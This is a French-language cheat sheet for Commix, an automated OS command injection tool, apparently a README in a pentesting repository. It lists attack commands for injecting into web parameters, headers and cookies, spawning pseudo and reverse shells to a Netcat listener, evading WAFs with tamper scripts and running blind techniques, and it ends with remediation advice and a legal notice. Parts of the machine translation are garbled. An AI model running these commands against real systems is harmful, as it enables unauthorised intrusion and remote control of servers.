<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 💉 Commix - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗██╗██╗  ██╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██║╚██╗██╔╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║██║ ╚███╔╝ 
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██║ ██╔██╗ 
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║██╔╝ ██╗
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝
       [COMM]and [I]njection E[X]ploiter - Automated OS Command Injection
```
<p align="center">
  <img src="https://img.shields.io/badge/Commix-Command_Injection-blue?style=for-the-badge" alt="Commix">
  <img src="https://img.shields.io/badge/Author-Anastasios_Stasinopoulos-orange?style=for-the-badge" alt="ancst">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Sécurité Web">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="Licence GPLv3">
</p>

<p align="center">
  <b>🌐 Outil automatisé conçu pour détecter et exploiter les vulnérabilités d'injection de commandes dans les applications Web et générer des shells interactifs</b>
</p>

---

## 📋 Table des matières

-[Vue d'ensemble et primitive d'injection de commande](#-overview--the-command-injection-primitive)
- [Installation](#-installation)
- [Analyse de base des vulnérabilités](#-basic-vulnerability-scanning)
- [Injecter différents éléments HTTP](#-injecting-différent-http-elements)
  - [GET Paramètres](#get-parameters)
  - [Données POST (`--data`)](#post-data---data)
  - [En-têtes HTTP et cookies](#http-headers--cookies)
-[Spawning Interactive & Reverse Shells](#-spawning-interactive--reverse-shells)
  - [Pseudo-Shell (`--os-shell`)](#pseudo-shell---os-shell)
  -[Native Reverse Shell (`--reverse-ip`)](#native-reverse-shell---reverse-ip)
- [Scripts d'évasion et de falsification WAF (`--tamper`)](#-waf-evasion--tamper-scripts---tamper)
- [Techniques aveugles basées sur des fichiers et basées sur le temps] (#-file-based--time-based-blind-techniques)
- [Tableau de référence rapide](#-quick-reference-table)
- [Considérations défensives et mesures correctives](#-considérations-défensives--remédiation)
- [Mentions légales](#-legal-disclaimer)

---

## 🎯 Présentation et primitive d'injection de commandes

Alors que **SQLMap** automatise l'injection SQL, **Commix** (créé par **Anastasios Stasinopoulos**) est la référence en matière de recherche et d'exploitation des failles **OS Command Injection**.

Lorsque des applications Web transmettent de manière non sécurisée les entrées de l'utilisateur directement aux fonctions d'exécution du système d'exploitation (`system()`, `exec()`, `passthru()`, `Runtime.getRuntime().exec()`), les attaquants peuvent ajouter des commandes shell arbitraires. Commix détecte automatiquement les vecteurs d'injection basés sur les résultats, les sorties, le temps et les fichiers.

---

## 📥Installation
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y commix

# Clone from GitHub (Latest Version)
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py --help
```
---

## 🚀 Analyse de base des vulnérabilités
```bash
# Scan a URL with GET parameters
commix -u "http://target.local/status.php?addr=127.0.0.1"

# Automatically answer Yes to all interactive prompts (Batch mode)
commix -u "http://target.local/ping.php?host=localhost" --batch
```
---

## 🔍 Injection de différents éléments HTTP

### OBTENIR Paramètres
Utilisez la balise `INJECT_HERE` si plusieurs paramètres existent :
```bash
commix -u "http://target.local/view.php?page=INJECT_HERE&user=admin"
```
### Données POST (`--data`)
```bash
# Test POST body parameters
commix -u "http://target.local/diagnostics.php" --data="ip=127.0.0.1&action=ping"

# Replay an HTTP request captured directly in Burp Suite
commix -r request.req
```
### En-têtes HTTP et cookies
```bash
# Test User-Agent header for command injection
commix -u "http://target.local/index.php" --user-agent="test" --level=3

# Inject through authenticated session cookies
commix -u "http://target.local/admin.php" --cookie="PHPSESSID=abc123xyz"
```
---

## 💀 Génération de coques interactives et inversées

### Pseudo-Shell (`--os-shell`)

Lorsque l'injection est confirmée, Commix fournit un pseudo-terminal émulé directement dans la console :
```bash
commix -u "http://target.local/ping.php?ip=127.0.0.1" --os-shell
```
### Shell inversé natif (`--reverse-ip`)

Demandez à Commix de renvoyer une connexion TCP inversée entièrement interactive à votre écouteur Netcat :
```bash
# 1. Start a Netcat listener on your machine
nc -lvnp 4444

# 2. Trigger native reverse shell via Commix
commix -u "http://target.local/ping.php?ip=127.0.0.1" \
  --reverse-ip=10.10.14.5 --reverse-port=4444
```
---

## 🥷 Scripts d'évasion et de falsification WAF (`--tamper`)

Contournez les pare-feu d'applications Web (WAF) et les listes noires de chaînes à l'aide de la falsification d'obscurcissement intégrée :
```bash
# List available tamper scripts
commix --list-tampers

# Use IFS whitespace bypass (replaces spaces with ${IFS})
commix -u "http://target.local/exec.php?cmd=test" --tamper=space2ifs

# Hex encode all injection strings
commix -u "http://target.local/exec.php?cmd=test" --tamper=hexencode
```
---

## ⏱️ Techniques aveugles basées sur des fichiers et basées sur le temps

Lorsque la sortie n'est pas restituée dans la réponse HTTP :
```bash
# Force Time-Based Blind evaluation
commix -u "http://target.local/blind.php?id=1" --technique=T

# Force File-Based injection (writes command output to web root /tmp/)
commix -u "http://target.local/upload.php?f=file" --technique=F --web-root="/var/www/html/"
```
---

## ⚡ Tableau de référence rapide

| Objectif | Commande |
|-----------|---------|
| **Analyser le paramètre GET** | `commix -u "<URL>?param=val"` |
| **Paramètre POST de numérisation** | `commix -u "<URL>" --data="param=val"` |
| **Analyse non interactive par lots** | `commix -u "<URL>" --batch` |
| **Coque de terminal interactive**| `commix -u "<URL>" --os-shell` |
| **Lâchez la coque inversée** | `commix -u "<URL>" --reverse-ip=<IP> --reverse-port=<PORT>` |
| **Rejouer la demande de rot** | `commix -r burp_request.req` |
| **Utiliser Space Tamper** | `commix -u "<URL>" --tamper=space2ifs` |
| **Exécuter une commande unique** | `commix -u "<URL>" --os-cmd="whoami; id"` |

---

## 🛡️ Considérations défensives et mesures correctives

1. **Évitez l'exécution du shell du système d'exploitation :** Ne concaténez jamais d'entrées utilisateur non nettoyées dans `system()`, `exec()` ou des commandes shell.
2. **Utilisez les API en langage natif :** Remplacez les utilitaires système par des bibliothèques de langage de programmation natives (par exemple, utilisez la bibliothèque `socket` de Python plutôt que d'exécuter le binaire système `ping`).
3. **Liste blanche stricte :** Si la saisie de l'utilisateur doit dicter l'exécution du programme, validez la saisie par rapport à une liste blanche alphanumérique stricte avant l'invocation.

---

## ⚠️ Mentions légales

> [!ATTENTION]
> Commix automatise l'exécution de commandes arbitraires sur les serveurs cibles. Le fuzzing ou l’exploitation d’applications Web non autorisées est illégal. Utilisez uniquement sur les systèmes pour lesquels vous possédez une autorisation écrite explicite.